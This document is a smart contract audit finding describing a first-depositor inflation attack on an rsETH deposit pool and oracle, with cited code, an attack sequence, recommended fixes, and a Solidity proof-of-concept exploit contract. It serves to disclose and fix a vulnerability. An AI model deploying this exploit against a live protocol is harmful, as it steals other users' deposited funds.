### Title
First Depositor Inflation Attack via Direct Asset Donation to LRTDepositPool - (File: contracts/LRTDepositPool.sol)

### Summary
An attacker can exploit the rsETH minting mechanism in `LRTDepositPool` by performing a first-depositor inflation attack. By depositing a minimal amount, then directly transferring a large quantity of LST tokens (or ETH) to the pool, and calling the public `LRTOracle.updateRSETHPrice()`, the attacker inflates `rsETHPrice` to a level where subsequent depositors who pass `minRSETHAmountExpected = 0` receive 0 rsETH for their full deposit, permanently losing their funds to the attacker.

### Finding Description

**Root cause — `LRTDepositPool.getRsETHAmountToMint`:**

```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
``` [1](#0-0) 

This is a plain integer division. When `lrtOracle.rsETHPrice()` is artificially large, the result rounds down to 0.

**`rsETHPrice` is a stored value updated by a public function:**

```solidity
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
``` [2](#0-1) 

Any unprivileged caller can trigger a price update at any time.

**`totalETHInProtocol` includes the raw token balance of `LRTDepositPool`:**

```solidity
assetLyingInDepositPool = IERC20(asset).balanceOf(address(this));
``` [3](#0-2) 

A direct ERC20 `transfer` to the pool inflates this value without minting any rsETH, directly inflating `rsETHPrice` on the next `updateRSETHPrice()` call.

**`_beforeDeposit` does not guard against `rsethAmountToMint == 0` when `minRSETHAmountExpected == 0`:**

```solidity
rsethAmountToMint = getRsETHAmountToMint(asset, depositAmount);

if (rsethAmountToMint < minRSETHAmountExpected) {
    revert MinimumAmountToReceiveNotMet();
}
``` [4](#0-3) 

`0 < 0` is `false`, so the deposit proceeds, assets are transferred in, and `_mintRsETH(0)` is called — the victim receives nothing.

**`pricePercentageLimit` defaults to 0, disabling the price-spike guard:**

```solidity
bool isPriceIncreaseOffLimit =
    pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);
``` [5](#0-4) 

When `pricePercentageLimit == 0` (the uninitialized default), the short-circuit makes `isPriceIncreaseOffLimit = false` unconditionally, allowing arbitrarily large price jumps.

**Attack sequence:**

1. `rsethSupply == 0` → `rsETHPrice = 1e18` (hardcoded). [6](#0-5) 

2. Attacker calls `depositAsset(stETH, 1, 0, "")` → mints 1 wei rsETH. Pool holds 1 wei stETH, 1 wei rsETH outstanding.

3. Attacker calls `stETH.transfer(LRTDepositPool, D)` directly. Pool now holds `D + 1` wei stETH; rsETH supply unchanged at 1 wei.

4. Attacker calls `updateRSETHPrice()`:
   - `totalETHInProtocol ≈ (D + 1)` wei ETH
   - `rsETHPrice = (D + 1) * 1e18 / 1 = (D + 1) * 1e18`

5. Victim calls `depositAsset(stETH, V, 0, "")` where `V < D + 1`:
   - `rsethAmountToMint = V * 1e18 / ((D + 1) * 1e18) = V / (D + 1) = 0` (rounds down)
   - `0 < 0` → no revert; victim's `V` stETH is transferred in, 0 rsETH minted.

6. Attacker withdraws via `LRTWithdrawalManager` with their 1 wei rsETH (100% of supply) → receives `D + 1 + V` stETH. Net gain: `V` stETH (victim's entire deposit).

### Impact Explanation

**Critical — direct theft of user funds.** The victim's deposit is permanently absorbed into the pool with zero rsETH minted. The attacker recovers their donation plus the victim's deposit when they redeem their rsETH. There is no recovery path for the victim.

### Likelihood Explanation

**Medium.** Two conditions must hold simultaneously:

1. `pricePercentageLimit == 0` — this is the contract's uninitialized default. Unless the admin explicitly calls `setPricePercentageLimit` with a non-zero value, the guard is inactive. [7](#0-6) 

2. The victim passes `minRSETHAmountExpected = 0` — common in DeFi integrations, scripts, or frontends that omit slippage protection. The protocol does not enforce a non-zero minimum.

The attack is most practical at protocol launch (when `rsethSupply` is near zero) and can be executed atomically via a smart contract in a single block.

### Recommendation

1. **Reject zero rsETH mints:** In `_beforeDeposit`, add `if (rsethAmountToMint == 0) revert ZeroRsETHMinted();` unconditionally, independent of `minRSETHAmountExpected`. [8](#0-7) 

2. **Set a non-zero `pricePercentageLimit` at initialization:** Require `pricePercentageLimit > 0` in `initialize` or set a safe default (e.g., 5% = `5e16`) to prevent large single-block price jumps. [9](#0-8) 

3. **Mint initial rsETH to a dead address on first deposit** (analogous to the SheepDog fix): When `rsethSupply == 0`, mint a minimum seed amount to `address(0xdead)` to ensure `totalShares` is never trivially small.

4. **Use a virtual offset in the price calculation** (OpenZeppelin ERC4626 pattern): Add a virtual supply offset so that `rsETHPrice` cannot be inflated to an extreme value by a small initial deposit plus donation.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

interface IDepositPool {
    function depositAsset(address, uint256, uint256, string calldata) external;
}
interface IOracle { function updateRSETHPrice() external; }
interface IERC20 { function transfer(address, uint256) external; function approve(address, uint256) external; }

contract InflationAttack {
    IDepositPool pool;
    IOracle oracle;
    IERC20 stETH;

    constructor(address _pool, address _oracle, address _stETH) {
        pool = IDepositPool(_pool);
        oracle = IOracle(_oracle);
        stETH = IERC20(_stETH);
    }

    function attack(uint256 donationAmount) external {
        // Step 1: Deposit 1 wei to become sole rsETH holder
        stETH.approve(address(pool), 1);
        pool.depositAsset(address(stETH), 1, 0, "");

        // Step 2: Donate directly to inflate totalETHInProtocol
        stETH.transfer(address(pool), donationAmount);

        // Step 3: Update rsETHPrice to reflect inflated balance
        // pricePercentageLimit must be 0 (default) for this to succeed
        oracle.updateRSETHPrice();

        // Now any victim depositing < donationAmount+1 stETH with
        // minRSETHAmountExpected=0 will receive 0 rsETH.
        // Attacker later redeems their 1 wei rsETH (100% of supply)
        // via LRTWithdrawalManager to claim the entire pool.
    }
}
```

The victim's call `depositAsset(stETH, V, 0, "")` where `V < donationAmount + 1` succeeds, transfers `V` stETH into the pool, and mints 0 rsETH — permanently losing the victim's funds to the attacker. [10](#0-9) [11](#0-10)

### Citations

**File:** contracts/LRTDepositPool.sol (L99-118)
```text
    function depositAsset(
        address asset,
        uint256 depositAmount,
        uint256 minRSETHAmountExpected,
        string calldata referralId
    )
        external
        nonReentrant
        whenNotPaused
        onlySupportedERC20Token(asset)
    {
        // checks
        uint256 rsethAmountToMint = _beforeDeposit(asset, depositAmount, minRSETHAmountExpected);

        // interactions
        IERC20(asset).safeTransferFrom(msg.sender, address(this), depositAmount);
        _mintRsETH(rsethAmountToMint);

        emit AssetDeposit(msg.sender, asset, depositAmount, rsethAmountToMint, referralId);
    }
```

**File:** contracts/LRTDepositPool.sol (L444-444)
```text
        assetLyingInDepositPool = IERC20(asset).balanceOf(address(this));
```

**File:** contracts/LRTDepositPool.sol (L506-521)
```text
    function getRsETHAmountToMint(
        address asset,
        uint256 amount
    )
        public
        view
        override
        returns (uint256 rsethAmountToMint)
    {
        // setup oracle contract
        address lrtOracleAddress = lrtConfig.getContract(LRTConstants.LRT_ORACLE);
        ILRTOracle lrtOracle = ILRTOracle(lrtOracleAddress);

        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
    }
```

**File:** contracts/LRTDepositPool.sol (L648-670)
```text
    function _beforeDeposit(
        address asset,
        uint256 depositAmount,
        uint256 minRSETHAmountExpected
    )
        private
        view
        returns (uint256 rsethAmountToMint)
    {
        if (depositAmount == 0 || depositAmount < minAmountToDeposit) {
            revert InvalidAmountToDeposit();
        }

        if (_checkIfDepositAmountExceedesCurrentLimit(asset, depositAmount)) {
            revert MaximumDepositLimitReached();
        }

        rsethAmountToMint = getRsETHAmountToMint(asset, depositAmount);

        if (rsethAmountToMint < minRSETHAmountExpected) {
            revert MinimumAmountToReceiveNotMet();
        }
    }
```

**File:** contracts/LRTOracle.sol (L64-68)
```text
    function initialize(address lrtConfigAddr) external initializer {
        UtilLib.checkNonZeroAddress(lrtConfigAddr);
        lrtConfig = ILRTConfig(lrtConfigAddr);
        emit UpdatedLRTConfig(lrtConfigAddr);
    }
```

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L125-128)
```text
    function setPricePercentageLimit(uint256 _pricePercentageLimit) external onlyLRTAdmin {
        pricePercentageLimit = _pricePercentageLimit;
        emit PricePercentageLimitUpdate(_pricePercentageLimit);
    }
```

**File:** contracts/LRTOracle.sol (L218-221)
```text
        if (rsethSupply == 0) {
            rsETHPrice = 1 ether;
            highestRsethPrice = 1 ether;
            return;
```

**File:** contracts/LRTOracle.sol (L256-257)
```text
            bool isPriceIncreaseOffLimit =
                pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);
```
